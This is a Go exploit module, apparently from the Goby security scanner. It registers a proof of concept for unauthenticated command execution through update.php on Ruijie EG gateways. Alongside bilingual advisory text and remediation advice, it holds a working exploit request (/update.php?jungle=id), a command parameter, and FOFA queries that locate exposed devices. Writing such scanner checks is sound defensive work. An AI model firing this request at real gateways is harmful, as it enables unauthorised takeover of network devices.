package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Ruijie EG update.php RCE",
    "Description": "<p>Ruijie EG Gateway is an efficient wireless gateway device.</p><p>There is a security vulnerability in the update.php file of Ruijie EG Easy Gateway, and unauthorized users can execute arbitrary commands.</p>",
    "Impact": "Ruijie EG update.php RCE",
    "Recommendation": "<p>Authenticate the update.php file interface</p><p>Set up a whitelist to prevent malicious users</p><p>Pay attention to the official website update: <a href=\"https://www.ruijie.com.cn/\">https://www.ruijie.com.cn/</a></p>",
    "Product": "Ruijie EWEB",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "锐捷 EG 易网关 update.php 文件命令执行漏洞",
            "Description": "<p>锐捷EG易网关是一款高效的无线网关设备。<br></p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">锐捷EG易网关 update.php 文件存在安全漏洞，未授权用户可执行任意命令。</span><br></p>",
            "Impact": "<p>锐捷EG易网关 update.php 文件存在安全漏洞，未授权用户可执行任意命令。<br></p>",
            "Recommendation": "<p>对 update.php文件接口鉴权处理</p><p>设置白名单防止恶意用户</p><p>关注官网更新：<a href=\"https://www.ruijie.com.cn/\">https://www.ruijie.com.cn/</a></p>",
            "Product": "锐捷EG易网关",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "Ruijie EG update.php RCE",
            "Description": "<p>Ruijie EG Gateway is an efficient wireless gateway device.<br></p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">There is a security vulnerability in the update.php file of Ruijie EG Easy Gateway, and unauthorized users can execute arbitrary commands.</span><br></p>",
            "Impact": "Ruijie EG update.php RCE",
            "Recommendation": "<p>Authenticate the update.php file interface</p><p>Set up a whitelist to prevent malicious users</p><p>Pay attention to the official website update: <a href=\"https://www.ruijie.com.cn/\">https://www.ruijie.com.cn/</a></p>",
            "Product": "Ruijie EWEB",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "body=\"EG易网关\"",
    "GobyQuery": "body=\"EG易网关\"",
    "Author": "abszse",
    "Homepage": "https://www.ruijie.com.cn/",
    "DisclosureDate": "2022-03-23",
    "References": [
        "https://fofa.so/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "10",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/update.php?jungle=id",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "gid=",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "uid=",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/update.php?jungle=id",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "gid=",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "uid=",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "ls",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10266"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
